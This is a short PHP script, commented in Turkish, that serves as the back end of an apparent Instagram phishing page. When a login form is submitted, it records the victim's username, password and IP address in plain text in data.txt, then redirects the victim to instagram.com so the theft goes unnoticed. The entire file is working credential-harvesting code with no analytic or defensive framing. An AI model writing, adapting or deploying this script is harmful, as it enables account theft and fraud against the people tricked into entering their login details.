<?php
if(isset($_POST['submit']))
{
    $user = htmlspecialchars($_POST['username']); //Username bilgisini çeker
    $pass = htmlspecialchars($_POST['password']); //Password bilgisini çeker
    $ip = $_SERVER['REMOTE_ADDR']; //İp adresini çeker

    $yaz = "Username: ".$user."\nPassword: ".$pass."\nİp Adresi: ".$ip."\n-----------------------------\n"; //Bilgileri değişkene atadık daha düzgün olsun diye

    $fp = fopen('data.txt', 'a');

    fwrite($fp, $yaz);
    fclose($fp);


    header("Location: http://www.instagram.com", true, 301); //İnstagram.com'a yönlendircek
    exit();
}
?>